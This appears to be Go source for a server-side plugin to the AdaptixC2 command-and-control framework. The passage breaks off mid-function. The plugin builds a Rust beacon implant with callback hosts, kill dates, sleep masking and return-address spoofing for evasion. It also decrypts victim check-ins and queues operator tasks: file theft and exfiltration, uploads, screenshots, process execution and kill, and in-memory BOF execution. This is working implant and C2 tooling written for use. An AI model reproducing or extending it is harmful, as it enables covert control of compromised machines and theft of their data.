// Specter-rs agent plugin for AdaptixC2 v1.2 (axc2 v1.2.0).
//
// Hybrid architecture (docs/ETUDE-DE-FAISABILITE.md §2): the beacon is the
// Rust rewrite, this plugin is the server-side build entry — the equivalent
// of specter's agent_specter, against the AdaptixC2 1.2 plugin ABI (the
// original specter targets 2.0).
//
// The single interface point with the beacon is the SPT_CONFIG JSON
// contract (decision 2026-10-22): BuildPayload writes the per-build config
// (AES key, sleep/jitter, watermark, kill epoch, malleable profile v2) and
// drives the beacon's own pipeline (make → cargo → rust-lld → blob).
package main

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	mrand "math/rand"
	"sort"
	"crypto/rc4"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/Adaptix-Framework/axc2"
)

var (
	ModuleDir     string
	AgentWatermark string
)

type PluginAgent struct{}

type ExtenderAgent struct{}

func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent {
	ModuleDir = moduleDir
	AgentWatermark = watermark
	if impl, ok := ts.(Teamserver); ok {
		Ts = impl
	}
	return &PluginAgent{}
}

// Teamserver: the server surface specter-rs currently exercises (the
// native beacon_agent declares the full interface; only these members are
// used by the MVP wire handlers).
type Teamserver interface {
	TsConvertCpToUTF8(data string, cp int) string
	TsAgentUpdateData(newAgentData adaptix.AgentData) error
	TsAgentTerminate(agentId string, terminateTaskId string) error
	TsTaskUpdate(agentId string, data adaptix.TaskData)
	TsAgentConsoleOutput(agentId string, messageType int, message string, clearText string, store bool)
	TsWin32Error(errorCode uint) string
	TsClientGuiFilesWindows(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataWin)
	TsClientGuiDisksWindows(taskData adaptix.TaskData, drives []adaptix.ListingDrivesDataWin)
	TsClientGuiProcessWindows(taskData adaptix.TaskData, process []adaptix.ListingProcessDataWin)
	TsClientGuiFilesStatus(taskData adaptix.TaskData)
	TsConvertUTF8toCp(data string, cp int) string
	TsTaskCreate(agentId string, cmdline string, client string, taskData adaptix.TaskData)
	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int64) error
	TsDownloadUpdate(fileId string, state int, data []byte) error
	TsDownloadClose(fileId string, reason int) error
	TsScreenshotAdd(agentId string, Note string, Content []byte) error
}

var Ts Teamserver

// Screenshot reassembly: the BMP streams across many POSTs (the beacon
// drains its heap buffer 48 KiB per cycle); chunks accumulate by task id
// until the FINISH record hands the full image to TsScreenshotAdd.
var screenshotRecon = make(map[uint]*bytes.Buffer)
var screenshotMutex sync.Mutex

// RC4Crypt: the session cipher (Encrypt == Decrypt == RC4, docs/WIRE.md) —
// same cipher, same keystream, as the beacon's specter_core::rc4.
func RC4Crypt(data []byte, key []byte) ([]byte, error) {
	cipher, err := rc4.NewCipher(key)
	if err != nil {
		return nil, err
	}
	out := make([]byte, len(data))
	cipher.XORKeyStream(out, data)
	return out, nil
}

// createTaskCommandSaveMemory: queue the upload content as SAVEMEMORY
// chunk tasks (they precede the UPLOAD command — the beacon assembles
// the chunks, then writes the file). Port of the native pl_utils.go,
// with our 8 KiB chunk size (the beacon's response-buffer contract).
func createTaskCommandSaveMemory(ts Teamserver, agentId string, buffer []byte) int {
	memoryId := int(mrand.Uint32())

	bufferSize := len(buffer)

	taskData := adaptix.TaskData{
		Type:    adaptix.TASK_TYPE_TASK,
		AgentId: agentId,
		Sync:    false,
	}

	for start := 0; start < bufferSize; start += uploadChunkSize {
		fin := start + uploadChunkSize
		if fin > bufferSize {
			fin = bufferSize
		}

		array := []interface{}{COMMAND_SAVEMEMORY, memoryId, bufferSize, fin - start, buffer[start:fin]}
		taskData.Data, _ = PackArray(array)
		taskData.TaskId = fmt.Sprintf("%08x", mrand.Uint32())

		ts.TsTaskCreate(agentId, "", "", taskData)
	}

	return memoryId
}

// sizeBytesToFormat: native pl_utils.go rendering (KiB/MiB/GiB).
func sizeBytesToFormat(size int64) string {
	if size > 1073741824 {
		return fmt.Sprintf("%.2f GiB", float64(size)/1073741824)
	} else if size > 1048576 {
		return fmt.Sprintf("%.2f MiB", float64(size)/1048576)
	} else if size > 1024 {
		return fmt.Sprintf("%.2f KiB", float64(size)/1024)
	}
	return fmt.Sprintf("%d B", size)
}

// Dialog argument helpers (native beacon_agent semantics).
func getStringArg(args map[string]any, key string) (string, error) {
	if value, ok := args[key].(string); ok {
		return value, nil
	}
	return "", fmt.Errorf("parameter '%s' must be set", key)
}

func getFloatArg(args map[string]any, key string) (float64, error) {
	if value, ok := args[key].(float64); ok {
		return value, nil
	}
	return 0, fmt.Errorf("parameter '%s' must be a number", key)
}

// getBoolArg (native beacon_agent: absent or non-bool is simply false).
func getBoolArg(args map[string]any, key string) bool {
	v, _ := args[key].(bool)
	return v
}

// Command ids on the wire (native beacon_agent, pl_utils.go).
const (
	COMMAND_TERMINATE = 10
	COMMAND_PROFILE   = 21
	COMMAND_PWD       = 4
	COMMAND_CD        = 8
	COMMAND_LS        = 14
	COMMAND_CAT       = 24
	COMMAND_MKDIR     = 27
	COMMAND_RM        = 17
	COMMAND_COPY      = 12
	COMMAND_MV        = 18
	COMMAND_GETUID     = 22
	COMMAND_DISKS      = 15
	COMMAND_PS_LIST    = 41
	COMMAND_PS_KILL    = 42
	COMMAND_PS_RUN     = 43
	COMMAND_JOB        = 0x8437
	COMMAND_JOB_LIST   = 46
	COMMAND_JOBS_KILL  = 47
	JOB_TYPE_PROCESS   = 0x3
	JOB_STATE_RUNNING  = 0x1
	JOB_STATE_FINISHED = 0x2
	JOB_STATE_KILLED   = 0x3
	COMMAND_DOWNLOAD   = 32
	COMMAND_UPLOAD     = 33
	COMMAND_EXFIL      = 35
	COMMAND_SAVEMEMORY = 0x2321
	COMMAND_ERROR      = 0x1111ffff

	// Screenshot (free id in the native numbering): the beacon captures the
	// screen into a heap BMP and streams it across cycles like a download;
	// the server reassembles by task id and hands the BMP to TsScreenshotAdd.
	COMMAND_SCREENSHOT  = 44
	SCREENSHOT_START    = 0x1
	SCREENSHOT_CONTINUE = 0x2
	SCREENSHOT_FINISH   = 0x3

	// BOF execution (native pl_utils.go).
	COMMAND_EXEC_BOF     = 50
	COMMAND_EXEC_BOF_OUT = 51

	BOF_STATE_STARTED  = 0x1
	BOF_STATE_FINISHED = 0x2

	CALLBACK_ERROR       = 0x0d
	CALLBACK_OUTPUT_OEM  = 0x1e
	CALLBACK_OUTPUT_UTF8 = 0x20

	BOF_ERROR_PARSE     = 0x101
	BOF_ERROR_SYMBOL    = 0x102
	BOF_ERROR_MAX_FUNCS = 0x103
	BOF_ERROR_ENTRY     = 0x104
	BOF_ERROR_ALLOC     = 0x105

	DOWNLOAD_START   = 0x1
	DOWNLOAD_CONTINUE = 0x2
	DOWNLOAD_FINISH  = 0x3
)

// Upload chunk size: the beacon's response buffer is 64 KiB — 8 KiB
// chunks leave room for several chunks plus the rest of the task pack
// (our contract; the native uses 1 MiB, the wire format is identical).
const uploadChunkSize = 0x2000

// int32ToIPv4: host-order u32 to dotted quad (native pl_utils.go).
func int32ToIPv4(value uint) string {
	return fmt.Sprintf("%d.%d.%d.%d", byte(value), byte(value>>8), byte(value>>16), byte(value>>24))
}

// GetOsVersion: port of the native beacon_agent mapping (pl_utils.go).
func GetOsVersion(majorVersion uint8, minorVersion uint8, buildNumber uint, isServer bool, systemArch string) (int, string) {
	var (
		desc      string
		os        = adaptix.OS_UNKNOWN
		osVersion = "unknown"
	)

	if majorVersion == 10 && minorVersion == 0 && isServer && buildNumber >= 26100 {
		osVersion = "Win 2025 Serv"
	} else if majorVersion == 10 && minorVersion == 0 && isServer && buildNumber >= 19045 {
		osVersion = "Win 2022 Serv"
	} else if majorVersion == 10 && minorVersion == 0 && isServer && buildNumber >= 17763 {
		osVersion = "Win 2019 Serv"
	} else if majorVersion == 10 && minorVersion == 0 && !isServer && buildNumber >= 22000 {
		osVersion = "Win 11"
	} else if majorVersion == 10 && minorVersion == 0 && isServer {
		osVersion = "Win 2016 Serv"
	} else if majorVersion == 10 && minorVersion == 0 {
		osVersion = "Win 10"
	} else if majorVersion == 6 && minorVersion == 3 && isServer {
		osVersion = "Win Serv 2012 R2"
	} else if majorVersion == 6 && minorVersion == 3 {
		osVersion = "Win 8.1"
	} else if majorVersion == 6 && minorVersion == 2 && isServer {
		osVersion = "Win Serv 2012"
	} else if majorVersion == 6 && minorVersion == 2 {
		osVersion = "Win 8"
	} else if majorVersion == 6 && minorVersion == 1 && isServer {
		osVersion = "Win Serv 2008 R2"
	} else if majorVersion == 6 && minorVersion == 1 {
		osVersion = "Win 7"
	}

	desc = osVersion + " " + systemArch
	if strings.Contains(osVersion, "Win") {
		os = adaptix.OS_WINDOWS
	}
	return os, desc
}

func (p *PluginAgent) GetExtender() adaptix.ExtenderAgent {
	return &ExtenderAgent{}
}

// GenerateConfig: the generation dialog fields (keys = container.put names
// in ax_config.axs).
type GenerateConfig struct {
	Format     string `json:"format"`
	Sleep      string `json:"sleep"`
	Jitter     int    `json:"jitter"`
	IsKillDate bool   `json:"is_killdate"`
	KillDate   string `json:"kill_date"`
	KillTime   string `json:"kill_time"`
	Debug      bool   `json:"debug"`
	SleepMask  bool   `json:"sleep_mask"`
	Stages     int    `json:"stages"`
	Hooks      bool   `json:"hooks"`
	// Diagnostic: skip the JMP [RBX] gadget scan so the ADD RSP harness
	// runs on every spoofed call (retspoof validation mode).
	RetSpoofAddrSp bool `json:"retspoof_force_addrsp"`
}

// sptConfig: the beacon build contract (crates/core/build.rs).
type sptConfig struct {
	AESKey      string          `json:"aes_key"`
	ListenerKey string          `json:"listener_key"`
	SleepMS     int             `json:"sleep_ms"`
	JitterMS    int             `json:"jitter_ms"`
	Watermark   uint32          `json:"watermark"`
	KillEpoch   int64           `json:"kill_epoch"`
	Debug       bool            `json:"debug"`
	SleepMask   bool            `json:"sleep_mask"`
	Stages      uint32          `json:"stages"`
	Hooks       bool            `json:"hooks"`
	// Diagnostic: skip the JMP [RBX] gadget scan so the ADD RSP harness
	// runs on every spoofed call (retspoof validation mode).
	RetSpoofAddrSp bool            `json:"retspoof_force_addrsp"`
	Profile        json.RawMessage `json:"profile"`
}

// listenerConfig: the fields of the listener's saved profile (TransportConfig
// of the BeaconHTTP listener) that shape the beacon — the listener is
// authoritative, the malleable profile provides the defaults it overrides.
type listenerConfig struct {
	CallbackAddresses []string `json:"callback_addresses"`
	EncryptKey        string   `json:"encrypt_key"`
	Uri               []string `json:"uri"`
	UserAgent         []string `json:"user_agent"`
	HbHeader          string   `json:"hb_header"`
	RequestHeaders    string   `json:"request_headers"`
	PagePayload       string   `json:"page-payload"`
}

// listenerOverrides validates the listener profile: a beacon built against
// a mismatched listener can never check in, so every mismatch fails the
// build instead of the first check-in.
func listenerOverrides(raw []byte) (listenerConfig, error) {
	var conf listenerConfig
	if err := json.Unmarshal(raw, &conf); err != nil {
		return conf, fmt.Errorf("listener profile: %w", err)
	}
	if len(conf.CallbackAddresses) == 0 {
		return conf, errors.New("listener profile: callback_addresses is required")
	}
	if len(conf.Uri) == 0 {
		return conf, errors.New("listener profile: uri is required")
	}
	if len(conf.UserAgent) == 0 {
		return conf, errors.New("listener profile: user_agent is required")
	}
	if conf.HbHeader == "" {
		return conf, errors.New("listener profile: hb_header is required")
	}
	if !strings.Contains(conf.PagePayload, "<<<PAYLOAD_DATA>>>") {
		return conf, errors.New("listener profile: page-payload must contain '<<<PAYLOAD_DATA>>>'")
	}
	// encrypt_key: 32 hex chars (16 bytes) — the listener validates the same.
	if len(conf.EncryptKey) != 32 {
		return conf, errors.New("listener profile: encrypt_key must be 32 hex chars")
	}
	if _, err := hex.DecodeString(conf.EncryptKey); err != nil {
		return conf, errors.New("listener profile: encrypt_key must be hex")
	}
	return conf, nil
}

// applyListener overrides the malleable profile with the listener's actual
// enforcement points (URI list, UA, hb_header, request headers, response
// page template, callback hosts).
func applyListener(profileRaw json.RawMessage, l listenerConfig) (json.RawMessage, error) {
	var prof map[string]any
	if err := json.Unmarshal(profileRaw, &prof); err != nil {
		return nil, fmt.Errorf("malleable profile: %w", err)
	}

	prof["hosts"] = l.CallbackAddresses
	prof["user_agent"] = l.UserAgent[0]
	prof["beacon_id_header"] = l.HbHeader

	post, ok := prof["post"].(map[string]any)
	if !ok {
		return nil, errors.New("profile: missing post section")
	}
	post["uris"] = l.Uri

	client, ok := post["client"].(map[string]any)
	if !ok {
		return nil, errors.New("profile: missing post.client section")
	}
	if metadata, ok := client["metadata"].(map[string]any); ok {
		metadata["name"] = l.HbHeader
	}
	headers := []string{}
	for _, line := range strings.Split(l.RequestHeaders, "\n") {
		if line = strings.TrimSpace(line); line != "" {
			headers = append(headers, line)
		}
	}
	client["headers"] = headers

	server, ok := post["server"].(map[string]any)
	if !ok {
		return nil, errors.New("profile: missing post.server section")
	}
	output, ok := server["output"].(map[string]any)
	if !ok {
		return nil, errors.New("profile: missing post.server.output section")
	}
	const marker = "<<<PAYLOAD_DATA>>>"
	idx := strings.Index(l.PagePayload, marker)
	output["prepend"] = l.PagePayload[:idx]
	output["append"] = l.PagePayload[idx+len(marker):]

	return json.Marshal(prof)
}

// parseDurationMS parses "30s" / "1h 2m 5s" style sleep values.
func parseDurationMS(s string) (int, error) {
	total := 0
	fields := strings.Fields(s)
	if len(fields) == 0 {
		return 0, errors.New("empty sleep value")
	}
	for _, f := range fields {
		unit := f[len(f)-1]
		num, err := strconv.Atoi(f[:len(f)-1])
		if err != nil || num < 0 {
			return 0, fmt.Errorf("invalid sleep field %q", f)
		}
		switch unit {
		case 'h':
			total += num * 3600_000
		case 'm':
			total += num * 60_000
		case 's':
			total += num * 1000
		default:
			return 0, fmt.Errorf("invalid sleep unit in %q (use h/m/s)", f)
		}
	}
	return total, nil
}

// beaconRepo returns the specter-rs checkout used for the build. The team
// server controls it with SPECTER_RS_DIR; the default covers the dev setup.
func beaconRepo() string {
	if dir := os.Getenv("SPECTER_RS_DIR"); dir != "" {
		return dir
	}
	home, err := os.UserHomeDir()
	if err != nil {
		return ""
	}
	return filepath.Join(home, "Documents", "specter-rs")
}

// malleableProfile reads the malleable profile v2 shipped next to the
// plugin. Hosts wiring per-listener comes with the phase 3 transport.
func malleableProfile() (json.RawMessage, error) {
	path := filepath.Join(ModuleDir, "profile_default.json")
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("malleable profile: %w", err)
	}
	return json.RawMessage(data), nil
}

// GenerateProfiles: one embedded profile per listener profile (v1.2 calls
// this before BuildPayload; multi_listeners is false in config.yaml).
func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, error) {
	var generateConfig GenerateConfig
	if err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig); err != nil {
		return nil, err
	}
	if _, err := parseDurationMS(generateConfig.Sleep); err != nil {
		return nil, err
	}
	mp, err := malleableProfile()
	if err != nil {
		return nil, err
	}
	out := make([][]byte, 0, len(profile.ListenerProfiles))
	for range profile.ListenerProfiles {
		out = append(out, mp)
	}
	return out, nil
}

// BuildPayload: compose the SPT_CONFIG JSON and drive the beacon pipeline.
func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
	if len(profile.ListenerProfiles) != 1 || len(agentProfiles) != 1 {
		return nil, "", errors.New("specter-rs builds against exactly one listener")
	}

	var generateConfig GenerateConfig
	if err := json.Unmarshal([]byte(profile.AgentConfig), &generateConfig); err != nil {
		return nil, "", err
	}

	sleepMS, err := parseDurationMS(generateConfig.Sleep)
	if err != nil {
		return nil, "", err
	}
	// Dialog jitter is a percentage (beacon convention); the beacon's jitter
	// is symmetric +/- ms (docs/PARITE.md, documented assumption).
	jitterMS := sleepMS * generateConfig.Jitter / 100

	watermark, err := strconv.ParseUint(AgentWatermark, 16, 32)
	if err != nil {
		return nil, "", fmt.Errorf("watermark %q: %w", AgentWatermark, err)
	}

	var killEpoch int64
	if generateConfig.IsKillDate {
		dt := generateConfig.KillDate + " " + generateConfig.KillTime
		t, err := time.Parse("02.01.2006 15:04:05", dt)
		if err != nil {
			return nil, "", errors.New("invalid killdate, use dd.MM.yyyy + HH:mm:ss")
		}
		killEpoch = t.Unix()
	}

	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return nil, "", err
	}

	listener, err := listenerOverrides(profile.ListenerProfiles[0].Profile)
	if err != nil {
		return nil, "", err
	}
	profileJSON, err := applyListener(agentProfiles[0], listener)
	if err != nil {
		return nil, "", err
	}

	cfg := sptConfig{
		AESKey:      hex.EncodeToString(key),
		ListenerKey: listener.EncryptKey,
		SleepMS:     sleepMS,
		JitterMS:    jitterMS,
		Watermark:   uint32(watermark),
		KillEpoch:   killEpoch,
		Debug:       generateConfig.Debug,
		SleepMask:   generateConfig.SleepMask,
		// Zero value of the dialog field (normal builds, no stage limit) maps
		// to the unlimited default; N > 0 = diagnostic freeze after N stages.
		Stages: func() uint32 {
			if generateConfig.Stages <= 0 {
				return 0xFFFFFFFF
			}
			return uint32(generateConfig.Stages)
		}(),
		Hooks:         generateConfig.Hooks,
		RetSpoofAddrSp: generateConfig.RetSpoofAddrSp,
		Profile:       profileJSON,
	}
	cfgJSON, err := json.Marshal(cfg)
	if err != nil {
		return nil, "", err
	}

	tmp, err := os.CreateTemp("", "specter-rs-config-*.json")
	if err != nil {
		return nil, "", err
	}
	tmpPath := tmp.Name()
	defer os.Remove(tmpPath)
	if _, err := tmp.Write(cfgJSON); err != nil {
		tmp.Close()
		return nil, "", err
	}
	tmp.Close()

	repo := beaconRepo()
	if repo == "" {
		return nil, "", errors.New("SPECTER_RS_DIR not set and no home directory")
	}

	cmd := exec.Command("make", "-C", repo, "blob")
	cmd.Env = append(os.Environ(), "SPT_CONFIG="+tmpPath)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return nil, "", fmt.Errorf("beacon build failed: %v\n%s", err, string(out))
	}

	blob, err := os.ReadFile(filepath.Join(repo, "build", "beacon.x64.bin"))
	if err != nil {
		return nil, "", fmt.Errorf("beacon blob not found after build: %w", err)
	}

	// Dead-blob guard (docs/ETUDE-DE-FAISABILITE.md 8bis): -Oz legally
	// eliminates any runtime path that is provably dead at compile time
	// (the iteration 8 bug: a too-short buffer made the whole HTTP
	// transaction vanish while every pipeline gate stayed green). The
	// only reliable detector is the produced bytes themselves: the blob
	// must embed every listener parameter it was built against.
	// A stage-limited build (diagnostic `stages`) freezes before any
	// listener-consuming code runs: -Oz legally eliminates those paths,
	// and the dead-blob guard below would rightly refuse it. Diagnostic
	// builds skip the embed check by design — they never check in.
	if generateConfig.Stages > 0 {
		return blob, "bin", nil
	}
	if err := verifyBlobEmbedsListener(blob, listener); err != nil {
		return nil, "", err
	}
	return blob, "bin", nil
}

// verifyBlobEmbedsListener: the generated blob must contain the listener's
// beat key, callback hosts, URIs, hb_header and page template — anything
// missing means the consuming code path was optimized out.
func verifyBlobEmbedsListener(blob []byte, l listenerConfig) error {
	key, err := hex.DecodeString(l.EncryptKey)
	if err != nil {
		return fmt.Errorf("listener encrypt_key: %w", err)
	}
	const marker = "<<<PAYLOAD_DATA>>>"
	idx := strings.Index(l.PagePayload, marker)

	needles := [][]byte{key, []byte(l.HbHeader), []byte(l.PagePayload[:idx]), []byte(l.PagePayload[idx+len(marker):])}
	for _, h := range l.CallbackAddresses {
		needles = append(needles, []byte(h))
	}
	for _, u := range l.Uri {
		needles = append(needles, []byte(u))
	}
	for _, n := range needles {
		if !bytes.Contains(blob, n) {
			return fmt.Errorf("generated blob does not embed listener parameter %q — the consuming code path was eliminated (dead blob)", n)
		}
	}
	return nil
}

// CreateAgent: parse the first check-in beat (docs/WIRE.md — the 19-field
// CheckPacker sequence of the native beacon_agent, tag v1.2).
func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.ExtenderAgent, error) {
	var agentData adaptix.AgentData

	packer := CreatePacker(beat)

	if false == packer.CheckPacker([]string{"int", "int", "int", "int", "word", "word", "byte", "word", "word", "int", "byte", "byte", "int", "byte", "array", "array", "array", "array", "array"}) {
		return agentData, nil, errors.New("error agentData data")
	}

	agentData.Sleep = packer.ParseInt32()
	agentData.Jitter = packer.ParseInt32()
	agentData.KillDate = int(packer.ParseInt32())
	agentData.WorkingTime = int(packer.ParseInt32())
	agentData.ACP = int(packer.ParseInt16())
	agentData.OemCP = int(packer.ParseInt16())
	agentData.GmtOffset = int(packer.ParseInt8())
	agentData.Pid = fmt.Sprintf("%v", packer.ParseInt16())
	agentData.Tid = fmt.Sprintf("%v", packer.ParseInt16())

	buildNumber := packer.ParseInt32()
	majorVersion := packer.ParseInt8()
	minorVersion := packer.ParseInt8()
	internalIp := packer.ParseInt32()
	flag := packer.ParseInt8()

	agentData.Arch = "x32"
	if (flag & 0b00000001) > 0 {
		agentData.Arch = "x64"
	}

	systemArch := "x32"
	if (flag & 0b00000010) > 0 {
		systemArch = "x64"
	}

	agentData.Elevated = false
	if (flag & 0b00000100) > 0 {
		agentData.Elevated = true
	}

	IsServer := false
	if (flag & 0b00001000) > 0 {
		IsServer = true
	}

	agentData.InternalIP = int32ToIPv4(internalIp)
	agentData.Os, agentData.OsDesc = GetOsVersion(majorVersion, minorVersion, buildNumber, IsServer, systemArch)

	agentData.SessionKey = packer.ParseBytes()
	agentData.Domain = string(packer.ParseBytes())
	agentData.Computer = string(packer.ParseBytes())
	agentData.Username = Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
	agentData.Process = Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)

	return agentData, &ExtenderAgent{}, nil
}

// --- ExtenderAgent: the session wire (RC4 + the native pack formats). ---

func (e *ExtenderAgent) Encrypt(data []byte, key []byte) ([]byte, error) {
	return RC4Crypt(data, key)
}

func (e *ExtenderAgent) Decrypt(data []byte, key []byte) ([]byte, error) {
	return RC4Crypt(data, key)
}

// PackTasks: [u32 LE total size || [taskData.Data || u32 LE taskId]*].
func (e *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {
	var (
		array []interface{}
		err   error
	)

	for _, taskData := range tasks {
		taskId, err := strconv.ParseInt(taskData.TaskId, 16, 64)
		if err != nil {
			return nil, err
		}
		array = append(array, taskData.Data)
		array = append(array, int(taskId))
	}

	packData, err := PackArray(array)
	if err != nil {
		return nil, err
	}

	size := make([]byte, 4)
	binary.LittleEndian.PutUint32(size, uint32(len(packData)))
	packData = append(size, packData...)

	return packData, nil
}

func (e *ExtenderAgent) PivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
	return adaptix.TaskData{}, errors.New("specter-rs pivots land with the SMB transport (phase 3+)")
}

// CreateCommand: the operator command surface (native beacon_agent
// semantics): sleep -> COMMAND_PROFILE subop 1, terminate ->
// COMMAND_TERMINATE with the exit method. The beacon parses exactly
// these records (crates/core/src/transport.rs).
func (e *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	var (
		taskData    adaptix.TaskData
		messageData adaptix.ConsoleMessageData
		err         error
	)

	command, ok := args["command"].(string)
	if !ok {
		return taskData, messageData, errors.New("'command' must be set")
	}
	subcommand, _ := args["subcommand"].(string)

	taskData = adaptix.TaskData{
		Type: adaptix.TASK_TYPE_TASK,
		Sync: true,
	}

	var array []interface{}

	switch command {

	case "sleep":
		var sleepTime int
		sleep, err := getStringArg(args, "sleep")
		if err != nil {
			goto RET
		}
		jitter, _ := getFloatArg(args, "jitter")
		jitterTime := int(jitter)

		sleepInt, err := strconv.Atoi(sleep)
		if err == nil {
			sleepTime = sleepInt
		} else {
			var t time.Duration
			t, err = time.ParseDuration(sleep)
			if err != nil {
				err = errors.New("sleep must be in '%h%m%s' format or number of seconds")
				goto RET
			}
			sleepTime = int(t.Seconds())
		}
		if jitterTime < 0 || jitterTime > 100 {
			err = errors.New("jitter must be from 0 to 100")
			goto RET
		}
		if jitterTime > 0 {
			messageData.Message = fmt.Sprintf("Task: sleep to %v with %v%% jitter", sleep, jitterTime)
		} else {
			messageData.Message = fmt.Sprintf("Task: sleep to %v", sleep)
		}

		array = []interface{}{COMMAND_PROFILE, 1, sleepTime, jitterTime}

	case "download":
		var path string
		path, err = getStringArg(args, "file")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_DOWNLOAD, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "upload":
		var fileName string
		var localFile string
		var fileContent []byte

		fileName, err = getStringArg(args, "remote_path")
		if err != nil {
			goto RET
		}
		localFile, err = getStringArg(args, "local_file")
		if err != nil {
			goto RET
		}
		fileContent, err = base64.StdEncoding.DecodeString(localFile)
		if err != nil {
			goto RET
		}

		memoryId := createTaskCommandSaveMemory(Ts, agentData.Id, fileContent)

		array = []interface{}{COMMAND_UPLOAD, memoryId, Ts.TsConvertUTF8toCp(fileName, agentData.ACP)}

	case "exfil":
		var fid string
		var fileId int64

		fid, err = getStringArg(args, "file_id")
		if err != nil {
			goto RET
		}
		fileId, err = strconv.ParseInt(fid, 16, 64)
		if err != nil {
			goto RET
		}

		if subcommand == "cancel" {
			array = []interface{}{COMMAND_EXFIL, adaptix.DOWNLOAD_STATE_CANCELED, int(fileId)}
		} else if subcommand == "stop" {
			array = []interface{}{COMMAND_EXFIL, adaptix.DOWNLOAD_STATE_STOPPED, int(fileId)}
		} else if subcommand == "start" {
			array = []interface{}{COMMAND_EXFIL, adaptix.DOWNLOAD_STATE_RUNNING, int(fileId)}
		} else {
			err = errors.New("subcommand must be 'cancel', 'start' or 'stop'")
			goto RET
		}

	case "getuid":
		array = []interface{}{COMMAND_GETUID}

	case "disks":
		array = []interface{}{COMMAND_DISKS}

	case "screenshot":
		array = []interface{}{COMMAND_SCREENSHOT}

	case "ps":
		if subcommand == "list" {
			array = []interface{}{COMMAND_PS_LIST}
		} else if subcommand == "kill" {
			var pid float64
			pid, err = getFloatArg(args, "pid")
			if err != nil {
				goto RET
			}
			array = []interface{}{COMMAND_PS_KILL, int(pid)}
		} else if subcommand == "run" {
			// Port of the native `ps run` (beacon_agent CreateCommand):
			// output capture flag, token flag (MVP: parsed, unused by the
			// beacon), suspend flag -> creation state, full command line.
			taskData.Type = adaptix.TASK_TYPE_JOB

			output := getBoolArg(args, "-o")
			impersonation := getBoolArg(args, "-i")
			suspend := getBoolArg(args, "-s")
			programState := 0
			if suspend {
				programState = 4
			}
			programArgs, _ := args["args"].(string)
			programArgs = Ts.TsConvertUTF8toCp(programArgs, agentData.ACP)

			array = []interface{}{COMMAND_PS_RUN, output, impersonation, programState, programArgs}
		} else {
			err = errors.New("subcommand must be 'list', 'kill' or 'run'")
			goto RET
		}

	case "jobs":
		if subcommand == "list" {
			array = []interface{}{COMMAND_JOB_LIST}
		} else if subcommand == "kill" {
			var job string
			var jobId int64

			job, err = getStringArg(args, "task_id")
			if err != nil {
				goto RET
			}
			jobId, err = strconv.ParseInt(job, 16, 64)
			if err != nil {
				goto RET
			}

			array = []interface{}{COMMAND_JOBS_KILL, int(jobId)}
		} else {
			err = errors.New("subcommand must be 'list' or 'kill'")
			goto RET
		}

	case "pwd":
		array = []interface{}{COMMAND_PWD}

	case "cd":
		var path string
		path, err = getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_CD, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "ls":
		var dir string
		dir, err = getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_LS, Ts.TsConvertUTF8toCp(dir, agentData.ACP)}

	case "cat":
		var path string
		path, err = getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_CAT, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "mkdir":
		var path string
		path, err = getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_MKDIR, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "rm":
		var path string
		path, err = getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_RM, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "cp":
		var src string
		var dst string
		src, err = getStringArg(args, "src")
		if err != nil {
			goto RET
		}
		dst, err = getStringArg(args, "dst")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_COPY, Ts.TsConvertUTF8toCp(src, agentData.ACP), Ts.TsConvertUTF8toCp(dst, agentData.ACP)}

	case "mv":
		var src string
		var dst string
		src, err = getStringArg(args, "src")
		if err != nil {
			goto RET
		}
		dst, err = getStringArg(args, "dst")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_MV, Ts.TsConvertUTF8toCp(src, agentData.ACP), Ts.TsConvertUTF8toCp(dst, agentData.ACP)}

	case "execute":
		// Port of the native `execute bof` (beacon_agent CreateCommand):
		// base64 file content, base64 param data (raw + NUL fallback).
		if subcommand != "bof" {
			err = errors.New("subcommand must be 'bof'")
			goto RET
		}
		taskData.Type = adaptix.TASK_TYPE_JOB

		async := getBoolArg(args, "-a")
		bofFile, _err := getStringArg(args, "bof")
		if _err != nil {
			err = _err
			goto RET
		}
		bofContent, berr := base64.StdEncoding.DecodeString(bofFile)
		if berr != nil {
			err = berr
			goto RET
		}
		var params []byte
		if paramData, ok := args["param_data"].(string); ok {
			params, err = base64.StdEncoding.DecodeString(paramData)
			if err != nil {
				params = []byte(paramData)
				params = append(params, 0)
				err = nil
			}
		}
		array = []interface{}{COMMAND_EXEC_BOF, async, "go", len(bofContent), bofContent, len(params), params}

	case "terminate":
		if subcommand == "thread" {
			array = []interface{}{COMMAND_TERMINATE, 1}
